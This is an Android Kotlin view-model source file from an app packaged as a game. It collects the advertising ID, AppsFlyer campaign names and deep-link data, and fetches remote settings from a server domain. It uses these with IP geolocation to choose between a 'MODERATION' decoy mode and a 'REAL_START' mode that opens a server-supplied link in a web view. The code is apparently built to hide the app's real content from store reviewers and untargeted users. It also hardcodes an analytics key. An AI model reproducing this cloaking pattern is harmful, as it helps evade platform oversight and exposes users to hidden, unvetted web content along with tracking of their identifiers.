package com.skgames.traffi

import android.app.Application
import android.content.Context
import androidx.lifecycle.LiveData
import androidx.lifecycle.MutableLiveData
import androidx.lifecycle.ViewModel
import androidx.lifecycle.viewModelScope
import com.appsflyer.AppsFlyerConversionListener
import com.appsflyer.AppsFlyerLib
import com.facebook.applinks.AppLinkData
import com.google.android.gms.ads.identifier.AdvertisingIdClient
import com.skgames.traffi.nev.Constance
import com.skgames.traffi.nev.DataForVebViev
import com.skgames.traffi.nev.DataFromApiResource
import dagger.hilt.android.lifecycle.HiltViewModel
import kotlinx.coroutines.*
import retrofit2.Retrofit
import retrofit2.converter.gson.GsonConverterFactory
import javax.inject.Inject

@HiltViewModel
class SortVievModell @Inject constructor(
    private val application: Application
) : ViewModel() {

    var tempApsData = "sad"

    private var _currentMode = MutableLiveData<SortClass>()
    val currentMode: LiveData<SortClass>
        get() = _currentMode

    private val _ansvFromGeoService = MutableLiveData<DataFromApiResource<CountryCodeJS?>>()
    val ansvFromGeoService: LiveData<DataFromApiResource<CountryCodeJS?>>
        get() = _ansvFromGeoService

    private val _ansvFromDevil = MutableLiveData<DataFromApiResource<GeoDev>>()
    val ansvFromDevil: LiveData<DataFromApiResource<GeoDev>>
        get() = _ansvFromDevil

    private val _advertisingIdClient = MutableLiveData<String>()
    val advertisingIdClient: LiveData<String>
        get() = _advertisingIdClient

    private val _link = MutableLiveData<String>()
    val link: LiveData<String>
        get() = _link

    private val _appsFlyerDattaGotten = MutableLiveData<String?>()
    val appsFlyerDattaGotten: LiveData<String?>
        get() = _appsFlyerDattaGotten

    private val _appLinkDataaaa = MutableLiveData<String?>()
    val appLinkDataaaa: LiveData<String?>
        get() = _appLinkDataaaa

    private fun saveSharedPref(key: String, data: String?) {
        val sharedPreferences = application.getSharedPreferences(
            Constance.KEY_MAIN_FOR_SHARED_PREF,
            Constance.MODE_PRIVATE
        )
        val editable = sharedPreferences.edit()

        editable.putString(key, data.toString())
        editable.apply()
    }

    private fun getFromSharedPref(key: String, defaultValue: String?): String? {
        val sharedPreferences = application.getSharedPreferences(
            Constance.KEY_MAIN_FOR_SHARED_PREF,
            Constance.MODE_PRIVATE
        )
        return sharedPreferences.getString(key, defaultValue)
    }

    init {


        viewModelScope.launch(Dispatchers.IO) {
            getAdvertisingIdClient()
        }

    }

    fun iniSettingVievModel() {
        _currentMode.value = SortClass.LOADING

        _appLinkDataaaa.value =
            getFromSharedPref(Constance.KEY_SHARED_PREF_APPLINK_DATA, null)
        _appsFlyerDattaGotten.value =
            getFromSharedPref(Constance.KEY_SHARED_PREF_APPS_FLY_DATA, null)
        _link.value = getFromSharedPref(Constance.KEY_SHARED_PREF_LINK, Constance.KEY_NOOOOO_DATA)
        _advertisingIdClient.value =
            getFromSharedPref(Constance.KEY_SHARED_PREF_ADVERT_ID, Constance.KEY_NOOOOO_DATA)

        _ansvFromGeoService.value = DataFromApiResource.Loading()
        _ansvFromDevil.value = DataFromApiResource.Loading()
    }

    fun fetchDeferredAppLinkData(context: Context) {
        AppLinkData.fetchDeferredAppLinkData(
            context
        ) { appLinkData: AppLinkData? ->
            appLinkData?.let {
                saveSharedPref(
                    Constance.KEY_SHARED_PREF_APPLINK_DATA,
                    it.targetUri.host.toString()
                )
                _appLinkDataaaa.postValue(it.targetUri.host.toString())

            }
            if (appLinkData == null) {
                if (appLinkDataaaa.value == null) {
                    saveSharedPref(Constance.KEY_SHARED_PREF_APPLINK_DATA, "null")
                    _appLinkDataaaa.postValue("null")
                }
            }
        }
    }

    fun sendDataForVebVeiv(): DataForVebViev {
        saveSharedPref(Constance.KEY_SHARED_PREF_ADVERT_ID, advertisingIdClient.value.toString())
        saveSharedPref(Constance.KEY_SHARED_PREF_LINK, link.value.toString())
        saveSharedPref(Constance.KEY_SHARED_PREF_APPLINK_DATA, appLinkDataaaa.value.toString())
        saveSharedPref(
            Constance.KEY_SHARED_PREF_APPS_FLY_DATA, appsFlyerDattaGotten.value.toString()
        )

        return DataForVebViev(
            appsFlyerDattaGotten = appsFlyerDattaGotten.value.toString(),
            advertisingIdClient = advertisingIdClient.value.toString(),
            appLinkData = appLinkDataaaa.value.toString(),
            linkViev = link.value.toString()
        )
    }


    suspend fun makeCheck() {


        val checker = ansvFromDevil.value?.data?.appsChecker ?: "99"

        val userGeo = ansvFromGeoService.value?.data?.countryCode ?: "noop"

        val listOfAllGeo = ansvFromDevil.value?.data?.geo ?: "none"

        when (checker) {

            "1" -> {

                var naming = getFromSharedPref(Constance.KEY_SHARED_PREF_APPS_FLY_DATA, null)
                var deep = getFromSharedPref(Constance.KEY_SHARED_PREF_APPLINK_DATA, null)
                while (true) {

                    if (naming != null && deep != null) {

                        naming = _appsFlyerDattaGotten.value
                        deep = appLinkDataaaa.value

                        saveSharedPref(Constance.KEY_SHARED_PREF_APPLINK_DATA, deep)
                        _appLinkDataaaa.postValue(deep)

                        saveSharedPref(Constance.KEY_SHARED_PREF_APPS_FLY_DATA, naming)
                        _appsFlyerDattaGotten.postValue(naming)

                        if (
                            deep!!.contains(Constance.KEY_TDB2) || naming!!.contains(
                                Constance.KEY_TDB2
                            ) || listOfAllGeo.contains(userGeo)
                        ) {
                            _currentMode.postValue(SortClass.REAL_START)
                        } else {
                            _currentMode.postValue(SortClass.MODERATION)
                        }

                        break
                    } else {
                        delay(1000)
                        if (naming == null) {
                            naming =
                                getFromSharedPref(Constance.KEY_SHARED_PREF_APPS_FLY_DATA, null)
                        }
                        if (deep == null) {
                            deep =
                                getFromSharedPref(Constance.KEY_SHARED_PREF_APPLINK_DATA, null)
                        }
                    }
                }
            }
            "55" -> {
                _currentMode.postValue(SortClass.TEST_VEB)
            }
            else -> {
                if (listOfAllGeo.contains(userGeo)) {
                    CoroutineScope(Dispatchers.IO).launch {
                        while (true) {
                            if (appLinkDataaaa.value != null) {
                                val dataAppLinkData =
                                    appLinkDataaaa.value ?: Constance.KEY_NOOOOO_DATA
                                if (dataAppLinkData.contains(
                                        Constance.KEY_TDB2
                                    ) || listOfAllGeo.contains(userGeo)
                                ) {
                                    _currentMode.postValue(SortClass.REAL_START_NO_APPS)
                                } else {
                                    _currentMode.postValue(SortClass.MODERATION)
                                }
                                break
                            } else {
                                delay(1000)
                            }
                        }
                    }
                } else {
                    _currentMode.postValue(SortClass.MODERATION)
                }
            }
        }
    }

    fun initAppsFlyerLib(context: Context) {
        AppsFlyerLib.getInstance()
            .init("EUBo2sR9eDH3fa45JwM2Y7", conversionDataListener, application)
        AppsFlyerLib.getInstance().start(context)
    }

    suspend fun getGeoData() {
        val frgtg = Retrofit.Builder()
            .addConverterFactory(GsonConverterFactory.create())
            .baseUrl("http://pro.ip-api.com/")
            .build()
            .create(ServiceApi::class.java)

        try {
            val result = frgtg.getData()
            if (result.isSuccessful) {

                val cooode = result.body()


                _ansvFromGeoService.postValue(DataFromApiResource.Success(data = cooode))

                getDataDev()
            }

        } catch (e: Exception) {
            _ansvFromGeoService.postValue(DataFromApiResource.Error(message = e.message.toString()))
        }
    }

    private suspend fun getDataDev() {
        val apiResponse = Retrofit.Builder()
            .addConverterFactory(GsonConverterFactory.create())
            .baseUrl("http://godsofaquamarine.xyz/")
            .build()
            .create(ServiceApi::class.java)

        if (apiResponse.getDataDev().isSuccessful) {

            val result = apiResponse.getDataDev().body()!!

            val responseVeiv = result.view
            val responseAppsCheker = result.appsChecker
            val responseGeo = result.geo


            _link.postValue(responseVeiv)

            _ansvFromDevil.postValue(DataFromApiResource.Success(data = result))

        } else {
            _ansvFromDevil.postValue(DataFromApiResource.Error(message = "error during loading"))
        }

        while (true) {
            if (_ansvFromDevil.value is DataFromApiResource.Success) {
                makeCheck()
                break
            } else {
                delay(1000)
            }
        }
    }


    private fun getAdvertisingIdClient() {
        val advertisingIdClient = AdvertisingIdClient(application)
        advertisingIdClient.start()
        val idUserAdvertising = advertisingIdClient.info.id ?: Constance.KEY_NOOOOO_DATA

        _advertisingIdClient.postValue(idUserAdvertising)

    }


    val conversionDataListener = object : AppsFlyerConversionListener {
        override fun onConversionDataSuccess(data: MutableMap<String, Any>?) {
            val dataGotten = data?.get("campaign").toString()
            tempApsData = dataGotten
            _appsFlyerDattaGotten.postValue(dataGotten)
            saveSharedPref(Constance.KEY_SHARED_PREF_APPS_FLY_DATA, dataGotten)


        }

        override fun onConversionDataFail(p0: String?) {

        }

        override fun onAppOpenAttribution(p0: MutableMap<String, String>?) {

        }

        override fun onAttributionFailure(p0: String?) {
        }
    }
}